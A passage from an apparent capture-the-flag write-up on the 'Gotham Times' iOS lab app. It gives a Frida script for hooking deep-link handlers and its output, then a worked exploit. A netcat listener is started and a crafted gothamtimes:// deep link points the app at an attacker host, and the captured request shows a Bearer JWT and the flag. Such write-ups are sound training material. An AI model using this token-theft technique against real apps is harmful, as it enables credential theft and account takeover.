 [-] returned: [UIWindowScene] <UIWindowScene: 0x1066063e0; role: UIWindowSceneSessionRoleApplication; persistentIdentifier: 04EAB7E8-1819-4E9B-BC75-C6342395CE82; activationState: UISceneActivationStateForegroundInactive>
[iOS Device::com.mobilehackinglab.Gotham-Times.J8L462KYQ8 ]->
```

<br />

**Frida script** that:

- Hooks `Gotham_Times.SceneDelegate - scene:openURLContexts:`
- Hooks `UIApplication -openURL:` and `-openURL:options:completionHandler:`
- Scans for exported symbols containing `openURL` and hooks them too (best-effort).
- Prints every URL received, highlighting if the scheme is `gothamtimes://`

<br />

you’ll see **every deep link** coming in. If it starts with `gothamtimes://`, it’ll show a 🚨 banner.

```javascript
// hook_openurl.js
// Deep link monitoring with Frida

if (!ObjC.available) {
    console.log("Objective-C runtime not available!");
    throw "ObjC required";
}

var TARGET_SCHEME = "gothamtimes"; // highlight scheme

function safe(fn) {
    try { return fn(); } catch (e) { return null; }
}

function highlight(url) {
    if (!url) return;
    var s = url.toString().toLowerCase();
    if (s.indexOf(TARGET_SCHEME + "://") === 0) {
        console.log("\n🚨🚨 GOT 'gothamtimes' URL 🚨🚨\n => " + url + "\n");
    }
}

// --- Hook SceneDelegate method ---
(function hookSceneDelegate() {
    var clsName = "Gotham_Times.SceneDelegate";
    var sel = "- scene:openURLContexts:";
    if (!ObjC.classes[clsName]) {
        console.log("[SceneDelegate] Class not found:", clsName);
        return;
    }
    if (!ObjC.classes[clsName][sel]) {
        console.log("[SceneDelegate] Selector not found:", sel);
        return;
    }

    var impl = ObjC.classes[clsName][sel].implementation;
    Interceptor.attach(impl, {
        onEnter: function (args) {
            console.log("\n[SceneDelegate scene:openURLContexts:] called");

            var set = ObjC.Object(args[3]); // NSSet<UIOpenURLContext>
            try {
                var arr = set.allObjects();
                var count = arr.count();
                console.log(" openURLContexts count:", count);
                for (var i = 0; i < count; i++) {
                    var ctx = arr.objectAtIndex_(i);
                    var url = safe(() => ctx.URL().absoluteString().toString());
                    var opts = safe(() => ctx.options());
                    console.log("  [" + i + "] URL:", url);
                    if (opts) console.log("       options:", opts.toString());
                    highlight(url);
                }
            } catch (e) {
                console.log("  (error iterating openURLContexts:", e.message, ")");
            }
        }
    });
    console.log("[SceneDelegate] Hooked", clsName, sel);
})();

// --- Hook UIApplication openURL: and openURL:options:completionHandler: ---
(function hookUIApplication() {
    var appCls = ObjC.classes.UIApplication;
    if (!appCls) {
        console.log("[UIApplication] Class not found");
        return;
    }

    var sel1 = "- openURL:";
    if (appCls[sel1]) {
        Interceptor.attach(appCls[sel1].implementation, {
            onEnter: function (args) {
                var url = ObjC.Object(args[2]);
                console.log("\n[UIApplication openURL:] URL:", url.toString());
                highlight(url.toString());
            }
        });
        console.log("[UIApplication] Hooked", sel1);
    }

    var sel2 = "- openURL:options:completionHandler:";
    if (appCls[sel2]) {
        Interceptor.attach(appCls[sel2].implementation, {
            onEnter: function (args) {
                var url = ObjC.Object(args[2]);
                var opts = ObjC.Object(args[3]);
                console.log("\n[UIApplication openURL:options:completionHandler:]");
                console.log(" URL:", url.toString());
                console.log(" options:", opts.toString());
                highlight(url.toString());
            }
        });
        console.log("[UIApplication] Hooked", sel2);
    }
})();

// --- Scan exports for openURL symbols (optional, best-effort) ---
(function hookExports() {
    try {
        Module.enumerateExports("UIKit", {
            onMatch: function (exp) {
                if (exp.type === "function" && exp.name.indexOf("openURL") !== -1) {
                    console.log("[Exports] Found:", exp.name, "@", exp.address);
                    try {
                        Interceptor.attach(exp.address, {
                            onEnter: function (args) {
                                console.log("\n[Exported function]", exp.name, "called");
                            }
                        });
                    } catch (e) {
                        console.log("  (cannot hook:", e.message, ")");
                    }
                }
            },
            onComplete: function () {}
        });
    } catch (e) {
        console.log("[Exports] enumerateExports failed:", e.message);
    }
})();
```

output

```
Spawning `com.mobilehackinglab.Gotham-Times.J8L462KYQ8`...              
[SceneDelegate] Hooked Gotham_Times.SceneDelegate - scene:openURLContexts:
[UIApplication] Hooked - openURL:
[UIApplication] Hooked - openURL:options:completionHandler:
Spawned `com.mobilehackinglab.Gotham-Times.J8L462KYQ8`. Resuming main thread!
[iOS Device::com.mobilehackinglab.Gotham-Times.J8L462KYQ8 ]->
[SceneDelegate scene:openURLContexts:] called
 openURLContexts count: 1
  [0] URL: gothamtimes://open?url=https://google.com
       options: <UISceneOpenURLOptions: 0x283715ec0; sourceApp: (null); annotation: (null); openInPlace: NO; _eventAttribution: (null)>

🚨🚨 GOT 'gothamtimes' URL 🚨🚨
 => gothamtimes://open?url=https://google.com

[iOS Device::com.mobilehackinglab.Gotham-Times.J8L462KYQ8 ]->
```



<br />

**Exploit the deep link to steal the user's JWT token**

Start a Netcat listener

```
└─# nc -nvlp 4444            
listening on [any] 4444 ...
```

<br />

 Change the URL parameter to point to your attacker IP and the port you're listening on, then open the deeplink.

```
gothamtimes://open?url=http://ip:port
```

<br />

The application loads external URLs supplied via deep links and sends the user’s JWT with those requests in the `Authorization` header.

```bash
└─# nc -nvlp 4444            
listening on [any] 4444 ...

GET / HTTP/1.1
Host: 192.168.1.4:4444
Connection: keep-alive
flag: FLAG{d33ply-l1nk3d(t0-w3bk1t}
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImgiLCJpYXQiOjE3NTg0NTE1NzF9.lqdi86bqV_VPb9rSO2fn89VZqDrNv368b5vpV76X2us
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate

```

<br />

**Flag:** FLAG{d33ply-l1nk3d(t0-w3bk1t}
